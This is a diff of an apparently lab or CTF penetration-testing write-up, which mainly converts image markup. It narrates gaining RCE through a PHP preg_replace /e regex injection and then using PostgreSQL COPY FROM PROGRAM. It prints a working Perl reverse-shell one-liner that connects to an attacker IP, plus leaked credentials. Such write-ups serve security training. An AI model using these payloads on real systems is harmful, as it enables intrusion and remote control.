@@ -65,21 +65,20 @@ database/seeds/DatabaseSeeder.php:            'password' => 'SplodgeSplodgeSplod
 
 Port 80 just showed us a 403 page, which was not helpful. Port 1337 did show some potential for RCE:
 
-<figure><img src="../../../.gitbook/assets/image (2042).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2042).png>)
 
 However, I was unable to make anything happen. Port 8080 showed a blog page with an admin login:
 
-<figure><img src="../../../.gitbook/assets/image (3407).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3407).png>)
 
 We can login to the admin panel using `admin:SplodgeSplodgeSplodge`:
 
-<figure><img src="../../../.gitbook/assets/image (2708).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2708).png>)
 
 So now we know that the Git repository is for this application. This panel was rather interesting, because it has a 'Profanity Filter Regex' option, which I presume allows us to specify Regex strings within it.
 
 I was unable to find any source code for this Admin Panel specifically, but I can find some code to see what it does within `app/Http/Controllers`:
 
-{% code title="PostController.php" %}
 ```php
 public function comment(Request $request, Post $post)
     {
@@ -93,7 +92,6 @@ public function comment(Request $request, Post $post)
         return view('post', ['post' => $post, 'comments' => $comments]);
     }
 ```
-{% endcode %}
 
 It seems that there's a `preg_replace` function that replaces the regex matches with our replacement.
 
@@ -103,15 +101,15 @@ Googling for PHP Regex exploits brings this up:
 
 From the article above, we can use regex of `/a/e` to inject PHP code. I tested this out:
 
-<figure><img src="../../../.gitbook/assets/image (3430).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3430).png>)
 
 Afterwards, I sent one comment with the letter 'a' in it. When I did, I got a hit on my HTTP server:
 
-<figure><img src="../../../.gitbook/assets/image (3400).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3400).png>)
 
 We now have RCE over the machine, and we can easily get a reverse shell on port 8080:
 
-<figure><img src="../../../.gitbook/assets/image (499).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(499).png>)
 
 ## Privilege Escalation
 
@@ -166,7 +164,6 @@ QUEUE_DRIVER=sync
 
 There's a database password there. We can then login with `psql` after fixing the `PATH` variable of this shell:
 
-{% code overflow="wrap" %}
 ```
 bash-4.2$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:$PATH
 
@@ -177,7 +174,6 @@ Type "help" for help.
 
 splodge=# 
 ```
-{% endcode %}
 
 There's a feature within PostgreSQL that allows us to execute commands:
 
@@ -189,17 +185,15 @@ SELECT * FROM cmd_exec;
 DROP TABLE IF EXISTS cmd_exec;
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1859).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1859).png>)
 
 We can just get another reverse shell using this:
 
-{% code overflow="wrap" %}
 ```sql
 COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.196:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (2400).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2400).png>)
 
 The payload is taken from Hacktricks.
 
@@ -207,4 +201,4 @@ The payload is taken from Hacktricks.
 
 User can run `bash` as `root`:
 
-<figure><img src="../../../.gitbook/assets/image (494).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(494).png>)
